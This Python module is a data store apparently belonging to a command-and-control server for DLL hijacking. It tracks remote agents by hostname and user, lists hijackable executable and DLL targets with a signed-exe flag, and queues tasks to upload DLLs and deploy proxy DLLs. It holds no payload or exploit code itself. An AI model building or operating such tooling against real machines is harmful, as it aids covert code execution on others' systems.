"""In-memory data store for agents, targets, and tasks."""

from __future__ import annotations
import time
import uuid
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path
from threading import Lock


class TaskType(str, Enum):
    UPLOAD_DLL = "upload_dll"
    DEPLOY_PROXY = "deploy_proxy"


class TaskStatus(str, Enum):
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"


class BuildStatus(str, Enum):
    WAITING_UPLOAD = "waiting_upload"
    BUILDING = "building"
    READY = "ready"
    DEPLOYED = "deployed"
    FAILED = "failed"


@dataclass
class Target:
    id: int
    exe_path: str
    dll_name: str
    vector: str
    import_type: str
    arch: str
    exe_signed: bool
    source_dll: str
    companion_dlls: list[str] = field(default_factory=list)
    score: int = 0

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class AgentTask:
    id: str
    agent_id: str
    type: TaskType
    target_id: int
    build_id: str | None = None
    status: TaskStatus = TaskStatus.PENDING
    created_at: float = 0.0

    def to_dict(self) -> dict:
        d = asdict(self)
        d["type"] = self.type.value
        d["status"] = self.status.value
        return d


@dataclass
class Build:
    id: str
    agent_id: str
    target_id: int
    dll_name: str = ""
    source_dll: str = ""
    exe_path: str = ""
    vector: str = ""
    arch: str = "x64"
    status: BuildStatus = BuildStatus.WAITING_UPLOAD
    original_dll_path: str = ""
    proxy_dll_path: str = ""
    error: str = ""

    def to_dict(self) -> dict:
        d = asdict(self)
        d["status"] = self.status.value
        return d


@dataclass
class Agent:
    id: str
    hostname: str
    username: str
    os_info: str
    first_seen: float
    last_seen: float
    targets: list[Target] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "os_info": self.os_info,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "target_count": len(self.targets),
        }


class Store:
    """Thread-safe in-memory store."""

    def __init__(self):
        self._lock = Lock()
        self.agents: dict[str, Agent] = {}
        self.tasks: dict[str, AgentTask] = {}
        self.builds: dict[str, Build] = {}
        self._target_counter = 0

    def upsert_agent(self, agent_id: str, hostname: str, username: str,
                     os_info: str, targets_raw: list[dict]) -> Agent:
        now = time.time()
        with self._lock:
            if agent_id in self.agents:
                agent = self.agents[agent_id]
                agent.last_seen = now
                agent.hostname = hostname
                agent.username = username
                agent.os_info = os_info
            else:
                agent = Agent(
                    id=agent_id, hostname=hostname, username=username,
                    os_info=os_info, first_seen=now, last_seen=now,
                )
                self.agents[agent_id] = agent

            # Refresh targets — stable IDs based on content
            agent.targets.clear()
            for t in targets_raw:
                stable_id = hash((t["exe_path"], t["dll_name"])) & 0x7FFFFFFF
                agent.targets.append(Target(
                    id=stable_id,
                    exe_path=t["exe_path"],
                    dll_name=t["dll_name"],
                    vector=t["vector"],
                    import_type=t.get("import_type", "static"),
                    arch=t.get("arch", "x64"),
                    exe_signed=t.get("exe_signed", False),
                    source_dll=t.get("source_dll", ""),
                    companion_dlls=t.get("companion_dlls", []),
                    score=t.get("score", 0),
                ))
            return agent

    def get_agent(self, agent_id: str) -> Agent | None:
        return self.agents.get(agent_id)

    def get_target(self, agent_id: str, target_id: int) -> Target | None:
        agent = self.agents.get(agent_id)
        if not agent:
            return None
        for t in agent.targets:
            if t.id == target_id:
                return t
        return None

    def create_build(self, agent_id: str, target_id: int) -> Build:
        build_id = uuid.uuid4().hex[:12]
        target = self.get_target(agent_id, target_id)
        build = Build(
            id=build_id, agent_id=agent_id, target_id=target_id,
            dll_name=target.dll_name if target else "",
            source_dll=target.source_dll if target else "",
            exe_path=target.exe_path if target else "",
            vector=target.vector if target else "",
            arch=target.arch if target else "x64",
        )
        with self._lock:
            self.builds[build_id] = build

            task = AgentTask(
                id=uuid.uuid4().hex[:12],
                agent_id=agent_id,
                type=TaskType.UPLOAD_DLL,
                target_id=target_id,
                build_id=build_id,
                created_at=time.time(),
            )
            self.tasks[task.id] = task
        return build

    def get_pending_tasks(self, agent_id: str) -> list[AgentTask]:
        with self._lock:
            return [t for t in self.tasks.values()
                    if t.agent_id == agent_id and t.status == TaskStatus.PENDING]

    def get_build(self, build_id: str) -> Build | None:
        return self.builds.get(build_id)

    def get_builds_for_agent(self, agent_id: str) -> list[Build]:
        return [b for b in self.builds.values() if b.agent_id == agent_id]
